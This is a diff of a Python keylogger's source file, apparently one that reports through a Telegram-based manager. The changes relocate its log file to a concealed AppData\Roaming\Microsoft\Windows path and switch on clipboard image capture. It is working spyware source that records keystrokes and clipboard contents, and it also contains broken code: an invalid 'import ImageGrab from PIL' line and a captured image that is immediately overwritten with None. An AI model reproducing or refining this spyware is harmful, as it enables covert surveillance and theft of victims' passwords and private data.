@@ -7,46 +7,14 @@ from pynput import keyboard
 import pyautogui
 import hashlib
 from KeyloggerManager import TelegramKeylogger
-
-try:
-    import win32gui
-except ImportError:
-    pass
-
-# def install_packages():
-#     # packages = [
-#     #     "Pillow", "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
-#     # ]
-#     packages = [
-#         "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
-#     ]
-#     for package in packages:
-#         subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
-#
-#
-# try:
-#     # from PIL import ImageGrab
-#     from pynput.keyboard import Key, Listener
-#     import logging
-#     import getpass
-#     import threading
-#     import time
-#     from pynput import keyboard
-#     import pyautogui
-#     import os
-#     import hashlib
-#     from pynput.keyboard import Key, Listener
-#     from KeyloggerManager import TelegramKeylogger
-#     import win32api
-#     import win32gui
-# except ImportError:
-#     install_packages()
+import win32gui
+import ImageGrab from PIL
 
 username = getpass.getuser()
 
 logger = logging.getLogger()
 logger.setLevel(logging.DEBUG)
-file_handler = logging.FileHandler(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', encoding='utf-8')
+file_handler = logging.FileHandler(f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows', encoding='utf-8')
 formatter = logging.Formatter('[{asctime}]: {message}', style='{', datefmt='%Y-%m-%d %H:%M:%S')
 file_handler.setFormatter(formatter)
 logger.addHandler(file_handler)
@@ -209,10 +177,9 @@ def clipboard_monitor(interval=5):
             logger.error(f"Clipboard monitor error: {e}")
 
         try:
-            # image = ImageGrab.grabclipboard()
+            image = ImageGrab.grabclipboard()
             image = None
             if image is not None:
-                # Создаем хэш изображения для сравнения
                 img_bytes = io.BytesIO()
                 image.save(img_bytes, format='PNG')
                 img_bytes.seek(0)
